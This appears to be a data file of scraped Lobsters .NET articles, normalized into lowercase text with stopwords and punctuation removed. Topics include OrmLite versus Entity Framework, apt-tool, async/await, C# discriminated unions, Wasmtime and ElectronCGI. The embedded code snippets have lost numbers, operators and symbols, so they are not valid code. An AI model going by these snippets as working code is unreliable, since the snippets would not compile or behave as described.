migrationsorderby x xversion installedmigrationsany x xversion migrationversion continue migrationrun connection connectioninsert new migration version migrationversion appliedon datetimeoffsetutcnow transactioncommit public class migration autoincrement public int id get set public int version get set public datetimeoffset appliedon get set public class imigration public void run idbconnection connection public int version public class imigration public void run idbconnection connection public int version public static void main string var factory new ormliteconnectionfactory memory sqlitedialectprovider var migrator new migrator factory new list imigration new new migratormigrate le line code solution nearzero issue happens issue good chance developer could fix within minute learning curve documentation read cli invoke hidden tax bill paid future change tracking find giant ball mutable state change detection via virtual proxy span application one edge provide huge benefit ability reason code opinion feature annoying performance overhead introduce using feature cause leak concern application layer adding asnotracking readonly query also ambient state application generally bad idea risk associated semantics savechanges differ depending upon factor outside scope make thing difficult reason first glance unit work hard time discussing feature people sometimes conflate pattern simple transaction exist raw ado issue intend use transactionscope ef little simple transaction nt intend using class nt missing feature choosing ormlite ef need transactionscopelike behavior multiple way could done first could invert creation object implicitly sharedscoped instance used every request also used asynclocal successfully use cached instance idbconnection idbtransaction every nested method call something could handrolled minimal line code similarly migration approach end matter intend use transactionscope otherwise nt feature missing lazy collection feature seem appealing first problematic want database query happen implicitly view compounded enumerating collection object nested lazy property causing additional database query loop really bad idea define query model upfront fully load avoid unintended side effect show unbounded collection inevitably grow misc happens thing performant ef great allows analyze sql executed point still mercy underlying sql generation may decide jump ef case execute raw sql even subject also nt like hearing caveat know use used right describing feature ef uncomfortable idea playing hot potato loaded gun hoping every person catch gun right everyone knowledgeable code review good thing depending upon nt good idea thing get past code review developer suck including even risk final word orm serve give typesafe approach writing sql anything else tax get compounded project evolves could use ef everything turn fine standard deviation success failure wide choose micro orm standard deviation much smaller quite frankly hardpressed ever find business requirement ef could solve feature ef provides ormlite nt welcomed developer timesaving nicetohaves however factor taxing nature using large framework like ef spend time using keep thing minimal baremetal especially true larger project involving people ranging experience like add anything please comment love discussion update created sharpdataaccess thin layer sits top servicestackormlite add migration ambient connectionstransactions
90,Lobsters,dotnet,"C#, F#, .NET programming",apt-tool: an alternative to debootstrap and multistrap for deterministic and predictable root filesystems. - Paul Knopf,https://pknopf.com/post/2019-11-26-announcing-apt-tool-an-alternative-to-debootstrap-and-multistrap-for-deterministic-and-predictable-root-filesystems/,apttool alternative debootstrap multistrap deterministic predictable root filesystems paul knopf,github project apttool overview overview,github project apttool overview apttool command tool generate root filesystems configuration file differs debootstrap multistrap many way key difference apttool behaves like see tool like npm packagesjsonpackageslockjson pair idea generate apttools imagelockjson file imagejson file consecutive build root filesystem completely predictable think linux devicesappliances update appliance typically entire root filesystem configuration point operating system nt vehicle run application operating system application application pythonc etc typically would build server produce output input word need able recompile older version year later confidence output since operating system considered application need predictability output git repository produce root file system debootstrap multistrap build commit even day later could updated package nt captured realize typically want package update better update captured via git commit updating imagelockjson file identifying issue may arise road using gitbisect also found debootstrap multistrap problematic output unpredictable debootstrap nt support multi apt repository multistrap nt configure package properly error install nt leverage dpkg much end made sense write tool also us dpkg apt much possible ensure bugfree experience overview us net install using following command sudo dotnet tool install apttool toolpath usrlocalbin check full example note example also build bootable img file generate rootfs idea simple though imagejson package locale latest latest latest networkmanager latest repository uri http debdebianorgdebian distribution buster component main contrib nonfree need generate imagelockjson apttool install imagelockjson installedpackages version architecture version architecture version architecture generate root file system sudo apttool generaterootfs script placed need run afterwards via chroot ran automatically using flag
92,Lobsters,dotnet,"C#, F#, .NET programming","Make your .NET programs more responsive with async/await in .NET Core, C# and VS Code",https://softchris.github.io/pages/dotnet-tasks.html,make net program responsive asyncawait net core c v code,make net program responsive using task asyncawait net core c v code twitter p l reference partitioning scheduling cancellation state task status iscanceled isfaulted iscompleted asyncawait blockingnonblocking demo authoring control flow blocking code scaffold project authoring method return type asyncawait control flow demo control flow demo wait using async apis full code summary,make net program responsive using task asyncawait net core c v code follow twitter happy take suggestion topic improvement chris run synchronous code block main thread anything else currently make software user experience slower need tldr concept thread netnet core excellent way schedule work carried parallel however might cumbersome use however library called tpl task parallel library life top thread model make really easy schedule manage work reference mentioned tpl library need know tpl central important concept life core apis part systemthreading systemthreadingtasks namespaces lot u like partitioning work scheduling thread threadpool cancellation support state management lowlevel detail basic concept need understand task task represent asynchronous operation like fetching content file calculation take time interesting property task allows u communicate ui example asynchronous work like status tell u currently working something done errored canceled iscanceled canceled would set true isfaulted something went wrong like exception would set true iscompleted finished operation would set true asyncawait await keyword mean finish asynchronous operation end end operation given result eg var filecontent await getfileasync method us await concept would need async keyword part method header blockingnonblocking use task blocking thread carry work exception though use method wait task forcing code run synchronously show demo next section lot thing like opening large file carrying web request maybe searching computer thing done parallel mean return back user much faster result app perceived faster responsive web development already us concept task heavily central concept tpl learning use tpl really make application responsive hope article feel empowered use tpl task demo demo demonstrate following authoring method author method using asyncawait return different type control flow show wait well specific task blocking code show usage result well wait affect code scaffold project let start creating solution like mkdir task cd task dotnet new sln create solution file next create console project like dotnet new solution taskdemo add solution like dotnet sln add taskdemotaskdemocsproj ready start coding open ide gon na go v code authoring method let open file programcs add following method inside class program static async task int sum int int b var result await taskfromresult b return result interesting thing go return type task int tell u task resolved return something type int taskfromresult creates task given value give calculation perform eg ab asyncawait see use async keyword inside method wait result arrive back u need followed async keyword ensure compiler happy easy think method nt need asynchronous imagine instead calculation take time would make sense control flow task marking async ensure wait task finish carrying code construct help u control flow taskwaitall one take list task essentially saying task need finish carry blocking see returning void typical usecase wait web request finish cause want return result consists u stitching data together taskwaitany give list task well meaning different say long task finished good usually race data towards endpoint search filefile content disk nt care finished first long get response also blocking waiting one task finish taskwhenall give task back interact task finished resolve taskwhenany give task back interact one task finished resolve let create demo control flow fake carrying timeconsuming work adding additional method class like static async task dosomething await taskdelay control flow add control flow code main method like var start datetimenow var tasksum sum var taskdelay dosomething taskwaitall tasksum taskdelay end datetimenow consolewriteline time taken end start full code programcs look like using system using systemthreadingtasks using systemio namespace taskdemo class program static async task dosomething await taskdelay static async task int sum int int b var result await taskfromresult b return result static void main string args var start datetimenow var tasksum sum var taskdelay dosomething taskwaitall tasksum taskdelay end datetimenow consolewriteline time taken endstart compile run get following response time taken though calculation calling sum took millisecond nt get response second later dosomething finished shift code waitall whenall would get different behavior code would kept going reported instead time taken lesson want code wait specific point using waitany good idea want start lot asynchronous work use still make code behave correctly whenall would need investigate status like var twotasks taskwhenall tasksum taskdelay twotasksiscompleted var end datetimenow consolewriteline tasksumresult wait test one create three new method mock opening file three method delay built differs static async task string await taskdelay return static async task string await taskdelay return static async task string await taskdelay return update program method code well var var var start datetimenow taskwaitany consolewriteline completed consolewriteline completed consolewriteline completed consolewriteline completed end datetimenow consolewriteline time taken end start see waiting one three task finish construct taskwaitany know method called finish first second let test running program completed false completed false completed true completed time taken see completed task nt completed yet using async apis ok understand async able leverage existing apis let look reading content file normally would create method like static async string readtxtfile using var sr new streamreader fileopen testtxt filemodeopen return srreadtoend would block though would nt able much else finish imagine really large file would really noticeable rewrite method use async version would instead get code looking like static async task string readtxtfile using var sr new streamreader fileopen testtxt filemodeopen return await srreadtoendasync nt block everyone happy blocking code one tricky part using tpl knowing call block happy code asynchronous suddenly end blocking anyway shall look well touched upon subject already waitall waitany block rule thumb seems return void use word wait sometimes want wait though learn intentional blocknonblock taskresult also block wait result available wait method task block cause wait code finished example taskdelay wait full code full code playing around want explore using system using systemthreadingtasks using systemio namespace taskdemo class program static async task string readtxtfile using var sr new streamreader fileopen testtxt filemodeopen return await srreadtoendasync static string taskdelay wait return static string taskdelay wait return static string taskdelay wait return static async task dosomething await taskdelay static async task int sum int int b var result await taskfromresult b return result static async task string await taskdelay return static async task string await taskdelay return static async task string await taskdelay return static void main string args var start datetimenow var var var var end datetimenow consolewriteline time taken endstart start datetimenow var tasksum sum var taskdelay dosomething taskwaitall tasksum taskdelay end datetimenow consolewriteline tasksumresult consolewriteline time taken endstart var var var start datetimenow taskwaitany consolewriteline completed consolewriteline completed consolewriteline completed consolewriteline completed end datetimenow consolewriteline time taken end start summary summary learned concept task anatomy additionally learned control flow also discussed blockingnonblocking code learn though like cancel task im gon na save one separate article add link cancellation reference section article
94,Lobsters,dotnet,"C#, F#, .NET programming",Discriminated Unions in C# — An Unexceptional Love Story,https://gist.github.com/76c36f875efc51d3421f99d3d116ad2c,discriminated union c unexceptional love story,discriminated union c unexceptional love story error exception source functional way look like http http implementation c http http friendly union type http http railway oriented programming http http conclusion,discriminated union c unexceptional love story secret programmer like think happy path sometimes happy path interesting part work case reflects welldefined business logic however error case result service disruption headache midnight support call figuring way handle error case better comprehensively possible significant part software engineering recent project kabbage experimented using discriminated union type c make error handling better code base error exception traditionally many error case represented exception objectoriented programming model generally fine error indeed exceptional namely nt happen often difficult predict time coding however error case easy foresee even come design model would easily abused cause number issue obvious one nt require explicit handling compiler knowledge exception could thrown compile time end completely remember visit sad path favorite thing programmer exception get unhandled unexpected thing happen range displaying mysterious stacktrace sensitive information clueless customer withholding resource supposed released normal flow common solution create safety net catch top level call stack prevents process completely crashing far elegant solution example throwing exception catching come cost especially method call deep call stack get frequently invoked contains rich metadata error benchmark show throwing error net hundred time slower simply returning error code value normal flow source contrast functional programming normally demand explicit error handling compile time integrates error case along happy path code flow kabbage try strive better way handle error however realistic move c code base functional programming language therefore came solution enforce explicit error handling special c type mimic discriminated union type functional world functional way look like functional programming environment function expected either successful error outcome make return union type defined http want use tsuccess case value need untangle type handle case match operator http type system enforces explicit error handling utilizing assignability rule wo nt able compile nt handle every single error case implementation c given union type yet supported c make good news nt comprehensive implementation case union type use member success case error case maybe occasionally started http created implicit type conversion make assigning type concise c compiler perform implicit type conversion declare variable var keep type checking working implementation model problem something like c http noticeable directly return happyresult instead new union tsuccess terror happyresult thanks implicit type conversion added friendly union type basic union type implementation consider integrate existing code base started first issue found code quickly become messy several method need chained together could end something like http generating requires access happy case value use nested match seems dreadful hard read observing pattern found two error type could probably combined together unified terror error similar data structure error message error type maybe contextual data may well combine error handler function unified handler terror e handle would become http little better still nested structure wer trying achieve also sometimes called railway oriented programming highlevel concept want code two flow happy flow error flow ideally want code look like two flow well namely want happy path converge one code block error flow converge already unified error type handler method need add new operator make code look look either type map operator flatmap operator common functional programming added exactly defined http either type viewed specialized union type two case left right fixed number case perform extra action map flatmap operator share common characteristic take either type variable something return another either type feature enables u write linq style code original problem http addition code much cleaner conclusion started project mostly type operator mentioned post gradually added helper expand scope adoption include take left case value work return value useful side effect doother mapother flatmapother map flatmapother right case also added integration async feature c code style work synchronous asynchronous function general rolled type several project started see smaller function body general clearer composition code style model possible error case either type change guaranteed bubble caller explicit error handling required course exception type still useful correct use case glad experiment allows u good middle ground objectoriented code base functional programming error handling model
95,Lobsters,dotnet,"C#, F#, .NET programming",Using WebAssembly from .NET with Wasmtime,https://hacks.mozilla.org/2019/12/using-webassembly-from-dotnet-with-wasmtime/,using webassembly net wasmtime,wasmtime bytecode alliance net core share code across platform securely isolate untrusted code improved interoperability interface type webassembly interface type proposal diving using webassembly net webassembly interface type wasmtime demo creating webassembly module markdown rust programming language rustup cargowasi pulldowncmark peeking hood webassembly module webassembly binary toolkit module need host webassembly system interface module call function host module offer host region memory module read write creating net project net core sdk later wasmtime nuget package importing net code webassembly good host wasmbindgen rendering markdown running net program next wasmtime net exposing wasmtime wasi implementation net language implementing interface type net wrap wasmtime demo repository,wasmtime webassembly runtime bytecode alliance recently added early preview api net core microsoft free opensource crossplatform application runtime api enables developer programmatically load execute webassembly code directly net program net core already crossplatform runtime net developer pay attention webassembly several reason excited webassembly net developer sharing executable code across platform able securely isolate untrusted code seamless interop experience upcoming webassembly interface type proposal share code across platform net assembly already built crossplatform use using native library example library written c rust difficult requires native interop distributing platformspecific build library supported platform however native library compiled webassembly webassembly module could used across many different platform programming environment including net would simplify distribution library application depend securely isolate untrusted code net framework attempted sandbox untrusted code technology code access security application domain ultimately failed properly isolate untrusted code result microsoft deprecated use sandboxing ultimately removed net core ever wanted load untrusted plugins application figure way prevent plugin invoking arbitrary system call directly reading process memory webassembly designed web environment untrusted code executes every time visit website webassembly module call external function explicitly import host environment may access region memory given host leverage design sandbox code net program improved interoperability interface type webassembly interface type proposal introduces way webassembly better integrate programming language reducing amount glue code necessary pas complex type back forth hosting application webassembly module support interface type eventually implemented wasmtime net api enable seamless experience exchanging complex type webassembly net diving using webassembly net article dive using rust library compiled webassembly net wasmtime net api help little familiar c programming language follow along api described fairly lowlevel mean quite bit glue code required conceptually simple operation passing receiving string value future also provide higherlevel api based webassembly interface type significantly reduce code required operation using api enable interacting webassembly module net easily would net assembly note also api still active development change backwardsincompatible way aiming stabilize stabilize wasmtime reading net developer okay check wasmtime demo repository corresponding implementation python nodejs rust creating webassembly module start building rust library used render markdown html however instead compiling rust library processor architecture compiling webassembly use net need familiar rust programming language follow along help rust toolchain installed want build webassembly module see homepage rustup easy way install rust toolchain additionally going use cargowasi command bootstrap everything need rust target webassembly cargo install cargowasi next clone wasmtime demo repository git clone http githubcombytecodealliancewasmtimedemosgit cd wasmtimedemos repository includes markdown directory contains rust library library wrap wellknown rust crate render markdown html note net developer crate like nuget package way let build markdown webassembly module using cargowasi cd markdown cargo wasi build release markdownwasm file directory curious rust implementation open srclibrs contains following use pulldowncmark html parser use wasmbindgen prelude wasmbindgen pub fn render input str string let parser parser new input let mut htmloutput string new html pushhtml mut htmloutput parser return htmloutput rust library exporting single function render take string markdown input return string rendered html code required parse markdown translate html provided pulldowncmark crate let step back simply appreciate happen taking popular rust crate wrapping line code expose functionality webassembly function compiling webassembly module load net regardless platform running cool peeking hood webassembly module webassembly module going use need host function functionality offer host figure let disassemble module textual representation using tool webassembly binary toolkit file called markdownwat markdownwasm enablemultivalue markdownwat note enablemultivalue option enables support function return multiple value required disassemble markdown module module need host module import define host provide module work import markdown module import wasiunstable fdwrite func fdwrite param result import wasiunstable randomget func randomget param result tell u module need two function host fdwrite randomget actually webassembly system interface wasi function welldefined behavior fdwrite used write data file descriptor randomget fill buffer random data shortly implement function net host important understand module call function host host get decide even function implemented module offer host module export define functionality offer host export markdown module export memory memory export render func rendermultivalueshim export wbindgenmalloc func wbindgenmalloc export wbindgenrealloc func wbindgenrealloc export wbindgenfree func wbindgenfree func rendermultivalueshim param result func wbindgenmalloc param result func wbindgenrealloc param result func wbindgenfree param first module exporting memory webassembly memory linear address space accessible module region memory module read write module access region host address space directly exported memory host exchange data webassembly module second module export render function implemented rust wait second two parameter return two value rust implementation one parameter one return value rust string slice str owned string string represented address length byte pair compiled webassembly thus webassembly version rust function take addresslength pair markdown input string return addresslength pair rendered html string address represented integer offset exported memory note since rust code return string owned type caller render responsible freeing returned memory containing rendered string implementation net host discus rest export creating net project need net core sdk create net core project make sure later sdk installed start creating directory project mkdir wasmtimedemo cd wasmtimedemo next create new net core console project dotnet new console finally add reference wasmtime nuget package dotnet add package wasmtime version ready use wasmtime net api load execute markdown webassembly module importing net code webassembly importing net function webassembly simple implementing ihost interface net requires public instance property represent webassembly module instance host bound import attribute used mark function field import webassembly module discussed earlier module requires two import host fdwrite randomget let create implementation function create file named hostcs project directory add following content using systemsecuritycryptography using wasmtime namespace wasmtimedemo class host ihost current wasi proposal const int wasierrnonotsup const int wasierrnosuccess public instance instance get set import fdwrite module wasiunstable public int writefile int fd int iovs int iovslen int nwritten return wasierrnonotsup import randomget module wasiunstable public int getrandombytes int buf int buflen randomgetbytes instanceexternsmemories spanslice buf buflen return wasierrnosuccess private rngcryptoserviceprovider random new rngcryptoserviceprovider fdwrite implementation simply return error indicating operation supported used module writing error stderr happen example randomget implementation fill requested buffer random byte slice span representing entire exported memory module net implementation write directly requested buffer without perform intermediate copy randomget function called implementation hashmap rust standard library take expose net function webassembly module wasmtime net api however load webassembly module use net need discus string get passed net host parameter render function good host based export module know export memory host perspective think webassembly module exported memory granted access address space foreign process even though module share process host randomly write data foreign address space bad thing quite easy corrupt state program cause undefined behavior crash total protonic reversal universe host pas data webassembly module safe manner internally rust program us memory allocator manage memory net good host webassembly module must also use memory allocator allocating freeing memory accessible webassembly module thankfully wasmbindgen used rust program export webassembly also exported two function purpose wbindgenmalloc wbindgenfree two function essentially malloc free c except wbindgenfree need size previous allocation addition memory address mind let u write simple wrapper exported function c easily allocate free memory accessible webassembly module create file named allocatorcs project directory add following content using system using systemcollectionsgeneric using systemlinq using systemtext using wasmtimeexterns namespace wasmtimedemo class allocator public allocator externmemory memory ireadonlylist externfunction function memory memory throw new argumentnullexception nameof memory malloc function f fname wbindgenmalloc singleordefault throw new argumentexception unable resolve malloc function free function f fname wbindgenfree singleordefault throw new argumentexception unable resolve free function public int allocate int length return int mallocinvoke length public int address int length allocatestring string str var length str int addr allocate length memorywritestring addr str return addr length public void free int address int length freeinvoke address length private externmemory memory private externfunction malloc private externfunction free code look complicated finding needed exported function name module wrapping easier use interface use helper allocator class allocate input string exported render function ready render markdown rendering markdown open programcs project directory replace following content using system using systemlinq using wasmtime namespace wasmtimedemo class program const string markdownsource hello net welcome webassembly wasmtime http wasmtimedev static void main using var engine new engine using var store enginecreatestore using var module storecreatemodule markdownwasm using var instance moduleinstantiate new host var memory instanceexternsmemoriessingleordefault throw new invalidoperationexception module must export memory var allocator new allocator memory instanceexternsfunctions var inputaddress var inputlength allocatorallocatestring markdownsource try object result instance dynamic render inputaddress inputlength var outputaddress int result var outputlength int result try consolewriteline memoryreadstring outputaddress outputlength finally allocatorfree outputaddress outputlength finally allocatorfree inputaddress inputlength let walk code stepbystep creates engine engine represents wasmtime runtime runtime enables loading executing webassembly module net creates store store webassembly object module instantiation kept multiple store engine associated object interact one another next creates module markdownwasm file disk module represents data webassembly module import export module one instantiation instantiation runtime representation webassembly module compiles module webassembly instruction instruction current cpu architecture allocates memory accessible module bind import host instantiates module using instance host class implemented earlier binding net function import find memory exported module creates allocator allocates string markdown source want render invokes render function input string casting instance dynamic c feature enables dynamic binding function runtime think simply shortcut searching exported render function invoking output rendered html reading returned string exported memory webassembly module finally free input string allocated returned string rust program gave u implementation onwards actually running code running net program run program need copy markdownwasm project directory run program find markdownwasm file directory built programcs source see program hardcoded markdown render hello net welcome webassembly wasmtime http wasmtimedev run program render html dotnet run everything went according plan result hello code net code welcome strong webassembly strong href http wasmtimedev wasmtime next wasmtime net surprisingly large amount c code necessary implement demo two major feature planned help simplify exposing wasmtime wasi implementation net language implementation host manually implement fdwrite randomget wasi function wasmtime wasi implementation currently accessible net api net api access configure wasi implementation wasmtime longer need net host provide implementation wasi function implementing interface type net discussed earlier webassembly interface type enable idiomatic integration webassembly hosting programming language net api implement interface type proposal need create allocator class like one implemented instead function use type like string simply work without write glue code net hope might look like future implement demo net using system using wasmtime namespace wasmtimedemo interface markdown string render string input class program const string markdownsource hello net welcome webassembly wasmtime http wasmtimedev static void main using var markdown moduleload markdown markdownwasm consolewriteline markdownrender markdownsource think agree look much better wrap exciting beginning using webassembly outside web browser many different programming environment including microsoft net platform net developer hope join u journey net demo code article found wasmtime demo repository
96,Lobsters,dotnet,"C#, F#, .NET programming",Exploring borrowed annotations in C#,https://blog.paranoidcoding.com/2019/12/02/borrowing.html,exploring borrowed annotation c,midori project,one request see fairly often c add concept borrowed value value used stored beyond invocation particular method generally come context feature require form ownership semantics like stack allocation class using statement resource management etc borrowing provides way safely use owned value without complicated ownership transfer feature explored working system c midori project context stack like allocation experiment successful brought significant performance win system experience also taught u quite bit difficulty introducing ownership concept language framework designed start help illustrate difficulty post going focus would look like borrowing added c reference type borrowing concept use store necessary prerequisite form ownership lacking borrowing desired feature like stack allocation class possible post borrowed reference denoted following type name widget normal reference widget borrowed reference subtyping relationship borrowed normal reference meaning widget convertible widget way around annotation applied local parameter applied field return type parameter ref class widget widget field void example widget normal widget borrowed borrowed normal okay converting widget widget borrowed okay converting widget widget normal borrowed error ca nt convert widget widget field normal okay converting widget widget field okay converting widget widget field borrowed error ca nt convert widget widget simple system enforces borrowed reference desired use store semantics value passed borrowed parameter method caller assured value longer referenced completion method stored field used generic argument returned smuggled via ref parameter system limiting though way invoke instance member borrowed reference reference instance method normal reference hence invoking instance method borrowed reference would effectively converting borrowed reference normal one break model allow method invocation let method mark reference borrowed adding method signature method override implement method marked borrowed must also marked borrowed abstract class resource method borrowed public abstract void printstatus normal method public abstract void close class myresource resource bool valid public override void printstatus consolewriteline valid valid myresource r error ca nt convert myresource myresource public override void close valid false static void example myresoure normal myresource borrowed normal borrowedprintstatus okay normalprintstatus okay borrowedclose error ca nt call normal method borrowed reference normalclose okay far seems pretty sensible borrowed value desired use store semantics clean integration type system minimal syntax burden happens though attempt leverage feature net sdk consider example stringformat parameter method never stored practice often source wasteful boxing allocation classic scenario borrowing bring big win parameter marked properly borrowed runtime safely stack allocate boxing allocation class string public void format string format object arg var strarg argtostring formathelper format stringarg example though also reveals significant problem call argtostring illegal definition objecttostring defined borrowed parameter worse net team fix going back marking objecttostring borrowed would massive compatibility break every override tostring would likewise need marked borrowed compat burden borrowing start fall feature limited tostring virtually entire surface area net borrowed value significantly hampered call method object gethashcode tostring referenceequals gettype finalize call operator etc used generic argument list widget call method interface defined net sdk surface area nonvirtual method could fixed updating annotation framework borrowed virtual method interface definition though changed would break compatibility mean object borrowed interface basically useless stored borrowed member invoked pretty significant problem mean good portion net framework api parameter never marked borrowed would make value unusable true object interface really unsealed type virtual method used mean large section net perfect ownership semantics never take advantage much brings question whether feature worth successful us borrowing would require significant duplication net framework surface area real change add borrowing semantics parameter ideal crux problem retrofitting language core feature like ownership problem extending year old language understand ownership also extending year old sdk present challenge need overcome case ownership though much whether sdk could adopt whether could added language say version borrowing laid post complete fact lacking number feature necessary good borrowing system relative lifetime annotation borrowed field returning borrowed value etc time though relatively solvable compared sdk compatibility issue
97,Lobsters,dotnet,"C#, F#, .NET programming",ElectronCGI - A solution to cross-platform GUIs for .Net Core,https://www.blinkingcaret.com/2019/11/27/electroncgi-a-solution-to-cross-platform-guis-for-net-core/,electroncgi solution crossplatform gui net core,full twoway communication node net electroncgi cross platform net core gui electron video nodejs net async improvement tpl dataflow tpl dataflow net core depth part tpl dataflow net core depth part change go wire nodejs npm package net nuget package better logging better debugging intellisense npm package full example calculator demo next electroncgi electroncgidotnet,net core brought ability run develop net multiple platform however still possible build graphical user interface gui using net run nonwindows environment multi platform gui electron probably popular choice electron application usually built exclusively using javascript case using net electron employing trick like full webserver net electron application regular website make request server mimic exactly working normal website difference website running inside electron requiring full webserver able run desktop application feel right plus deal intricacy web framework end goal desktop application feel wasteful electroncgi alternative webserver required way work starting net process node using stdin stdout stream communication channel enables full duplex communication two process written different language little overhead also electroncgi make super easy create connection listen send request even though electroncgi requires node net named electroncgi imagined primary use case would enabling writing gui electron whose behavior defined net electroncgi limited though useful scenario want need functionality form net node way around last couple month working improving electroncgi namely intellisense javascript electroncgi importedrequired also improving async support net finally enabling full duplex communication two process ie net code start request fulfilled node improvement blog post full twoway communication node net electroncgi cross platform net core gui electron original blog post introduced electroncgi change syntax last version one discussing blog post want know motivation behind electroncgi read comprehensive discussion get started place go alternatively also watch video show setup electroncgi also showcase application built continue example demonstrates two way communication node net using electroncgi let describe terminology electroncgi provides ability create connection node net project connection initiated node net project listens connection nodejs creating connection look like node const connectionbuilder require electroncgi const connection new connectionbuilder connectto pathtodotnetexcecutable build connectingto net process supply path executable also use dotnet command appropriate argument advantage requiring publish dotnet executable every time make change use dotnet command change automatic compilation step triggered executable run would look like const connectionbuilder require electroncgi const connection new connectionbuilder connectto dotnet run project pathtodotnetcoreproject build connection node send request net process connectionsend loadorder orderid order something order connection send method required argument request type eg loadorder one request argument eg orderid callback function invoked request loadorder handled net connected process omit callback function expecting response net eg connectionsend start connectionsend select theselection expecting response form net need send argument currently support send null undefined example ignore argument net example connectionsend start null consolelog started new version also register handler request type initiated net example connectionon post listofposts something listofposts net listening incoming connection look like net var connection new connectionbuilder build register handler request type connectionlisten register handler request type use one overload connectionon example connectiononasync int order loadorder async orderid var order await ordersdbgetorder orderid return order also send request net nodejs directly example connectionsend theanswer want run code nodejs handle que request connectionsendasync getdata whichdata async thedata await dbsave thedata basically request capability node available net well async improvement last release adding proper async support net previous version even though could register async request handler onasync connection method handler would run sequence mean request one would take second another would take second would get response second request second time request would take complete version request come another still handled run parallel example would get response second request second impact change easier visualise imagine next two gifs show making concurrent request take random amount time complete look like one version example request sent nodejs number response received corresponding square grid turn red version version concurrency enabled using tpl dataflow wrote two blog post dataflow tpl dataflow net core depth part tpl dataflow net core depth part process incorporating electroncgi change go wire version added ability full duplex communication nodejs net consequence format message exchanged two process changed previously message sent nodejs net following format net stdin id guid request type therequesttype args jsonstringify theargspassedinsend response net nodejs net stdout id guid request result return value handler property omitted value returned old format assumed request written net stdin stream response stdout new version type message sent either channel stdin stdout new message format type request request type therequesttype id guid request args jsonstringify theargspassedinsend type response response id guid request result return value handler property omitted value returned consequence change upgrade nodejs npm package net nuget package get communication error better logging create connection net project option enable logging definitely since point time project way visibility something go wrong net project turn var connection new connectionbuilder withlogging minimumloglevel logleveltrace logfilepath thelogfiletxt build minimumloglevel logfilepath optional default value logleveldebug electroncgilog respectively uncaught exception request handler net look like log electroncgidotnethandlerfailedexception request handler request type start failed systemexception error occurred error detail redditscannerprogram main dmovenext homeblinkingcaretelectroncgiduplexredditshowcaseredditnewpostsscannerdotnetprogramcs line end stack trace previous location exception thrown electroncgidotnetrequesthandler guid requestid object argument homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetrequesthandlercs line electroncgidotnetrequestexecutor executeasync dmovenext homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetrequestexecutorcs line end inner exception stack trace electroncgidotnetrequestexecutedchannelmessagesend ichannel channel homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetrequestexecutedchannelmessagecs line electroncgidotnetmessagedispatcher startasync dmovenext homeblinkingcaretpublishedelectroncgidotnetelectroncgidotnetmessagedispatchercs line turn logleveltrace message exchanged process also logged better debugging building application taking advantage electroncgi capability difficult understand thing going way expect especially problem net side thing previous version apart log file connection closing feedback thing work expected especially annoying example compile error net code incorrect path calling dotnet run connection would simply close feedback available going forward electroncgi redirects net stderr stream node process stdout stream inverts background color highlight message came net stderr see example mistype path net project creating connection nodejs image see console run node project creates connection using dotnet run project paththatdoesnotexist would see ran dotnet run projet paththatdoesnotexist directly part red highlighted yellow box see node project console output terribly helpful case would better msbuild output also written stderr easy way change mistake helpful error message example mistype project eg dotnet project path also mean net code use consoleerrorwriteline message displayed node process console might useful development also possible use visual studio debugger attach net application running add breakpoints debugging experience identical net application video example application described later post sure pick right process net attach dropdown intellisense another addition improve development experience using electroncgi availability intellisense include electroncgi npm package get need update latest npm package full example version decided create example focused async duplex ie ability initiate request either node net decided keep example simple possible instead using electron application nodejs net core application connect reddit periodically fetch new post subreddit user select application start want see example electron calculator demo video enceladosviewer application allows user query postgres database ui built using angular app github see video running reason github relies postgres db time create stripped version ok example version application allows select subreddit every second update list latest post subreddit request type used example sent nodejs net one net node node request type start stop selectsubreddit net nodejs showposts request type one interesting thing example start request execute net stop request received node stop request arrive net process sends showposts request node list post start running selectsubreddit request arrives form node update selected subbreddit maintained net moment showposts request contain post new subreddit happen sample app though selectsubredit request sent start diagram summarizes example find full source code example github interesting part net side short description request type work first selectsubreddit code main method var selectedsubreddit connectionon selectsubreddit string newsubreddit selectedsubreddit newsubreddit use closure update shared variable named selectedsubreddit going hold subreddit name illustrates maintain state net side next start request type cancellationtokensource cancelationtokensource new cancellationtokensource connectiononasync start async consoleerrorwriteline started show node console await taskrun async true cancelationtokensourcetokeniscancellationrequested return try var post await redditclientgetlatestpostsfromsubreddit selectedsubreddit connectionsend showposts post await taskdelay catch exception ex consoleerrorwriteline failed get post selectedsubreddit maybe exist show node console consoleerrorwriteline exmessage return cancelationtokensourcetoken using async await task created inside start request handler task second interval query reddit new post selected subreddit every time new post read request named showposts dispatched net node list latest post illustrates duplex part ie nodejs net initiate request go cancel method invoked cancellationtokensource happens start request handler completes theory start request may run indefinitely performing start request nodejs look like connectionsend start null run start finish net connectionclose mean connection maintained start request completes finally stop request handler net invokes cancelationtokensource cancel method connectionon stop consoleerrorwriteline stop cancelationtokensource null cancelationtokensourcecancel cause start request handler complete nodejs showposts request handler display latest post console connectionon showposts post consoleclear postslength consolelog result postsforeach post consolelog posttitle postupvotecount posturl n next one really important thing future electroncgi getting feedback easiest way give feedback project github issue electroncgi electroncgidotnet probably work next error handling particularly error propagate nodejs net viceversa right exception handler net get written log file process terminates ideal alternative error surface process example connectionsend getorder orderid err order err error else use order something might interesting send method nodejs return promise resolve reject case request successful fails respectively finally documentation necessarily related electroncgi particular using electron electroncgi technology like react angular vue blazor hoop jump order get good development experience writing ui using react angular nonui logic running net core electroncgi also something plan write future related
